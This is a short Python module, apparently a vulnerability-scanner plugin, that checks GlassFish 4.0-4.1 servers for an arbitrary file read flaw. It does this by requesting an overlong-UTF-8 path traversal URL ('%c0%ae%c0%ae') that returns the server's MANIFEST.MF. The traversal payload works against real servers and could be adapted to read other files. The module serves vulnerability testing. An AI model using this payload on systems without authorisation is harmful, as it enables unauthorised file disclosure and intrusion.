#!/usr/bin/env python3

from app.lib.common import get_useragent
from app.lib.request import request

class Glassfish_File_Read_BaseVerify:
    def __init__(self, url):
        self.info = {
            'name': 'Glassfish文件任意读取漏洞',
            'description': 'Glassfish文件任意读取漏洞,影响范围为: Glassfish 4.0-4.1',
            'date': '2015-10-03',
            'exptype': 'check',
            'type': 'File Read'
        }
        self.url = url
        self.headers = {
                "User-Agent": get_useragent()
        }

    async def check(self):

        """
        检测是否存在漏洞

        :param:

        :return bool True or False: 是否存在漏洞
        """

        url = self.url + '/theme/META-INF/%c0%ae%c0%ae/META-INF/MANIFEST.MF'
        try:
            req = await request.get(url, headers = self.headers, allow_redirects = False)
            if 'Version' in await req.text():
                return True
            
        except Exception as e:
            # print(e)
            pass

if __name__ == '__main__':
    Glassfish_File_Read = Glassfish_File_Read_BaseVerify('https://192.168.30.242:4848')
    Glassfish_File_Read.check()